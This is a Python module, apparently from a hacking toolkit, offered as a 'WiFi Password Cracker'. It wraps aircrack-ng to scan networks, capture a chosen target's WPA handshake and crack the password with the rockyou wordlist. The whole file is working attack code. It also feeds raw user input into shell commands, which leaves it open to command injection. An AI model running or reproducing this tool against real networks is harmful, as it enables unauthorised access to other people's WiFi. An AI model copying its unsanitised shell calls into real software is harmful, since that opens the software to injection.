#!/usr/bin/env python3
# WIFI PASSWORD CRACKER - Cracker WiFi (butuh aircrack)

import os
import subprocess
from core.colors import Colors

class WiFiCracker:
    def __init__(self):
        self.name = "WiFi Password Cracker"
    
    def check_tools(self):
        tools = ["aircrack-ng", "airodump-ng", "aireplay-ng"]
        missing = []
        for tool in tools:
            if subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode != 0:
                missing.append(tool)
        return missing
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        print(f"{Colors.RED}[!] This requires root and external WiFi adapter!{Colors.END}")
        
        missing = self.check_tools()
        if missing:
            print(f"{Colors.RED}[!] Missing tools: {', '.join(missing)}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Install: sudo apt install aircrack-ng{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[1]{Colors.END} Scan WiFi Networks")
        print(f"{Colors.GREEN}[2]{Colors.END} Capture Handshake")
        print(f"{Colors.GREEN}[3]{Colors.END} Crack Password")
        print(f"{Colors.GREEN}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.RED}└─{Colors.WHITE}$ {Colors.END}")
        
        if choice == '1':
            iface = input(f"{Colors.GREEN}Interface (wlan0) > {Colors.END}") or "wlan0"
            os.system(f"sudo airmon-ng start {iface}")
            os.system(f"sudo airodump-ng {iface}mon")
        elif choice == '2':
            bssid = input(f"{Colors.GREEN}Target BSSID > {Colors.END}")
            channel = input(f"{Colors.GREEN}Channel > {Colors.END}")
            iface = input(f"{Colors.GREEN}Interface > {Colors.END}") or "wlan0mon"
            os.system(f"sudo airodump-ng --bssid {bssid} -c {channel} -w capture {iface}")
        elif choice == '3':
            cap_file = input(f"{Colors.GREEN}Capture file (.cap) > {Colors.END}")
            wordlist = input(f"{Colors.GREEN}Wordlist path > {Colors.END}") or "/usr/share/wordlists/rockyou.txt"
            os.system(f"sudo aircrack-ng -w {wordlist} {cap_file}")

if __name__ == "__main__":
    tool = WiFiCracker()
    tool.run()
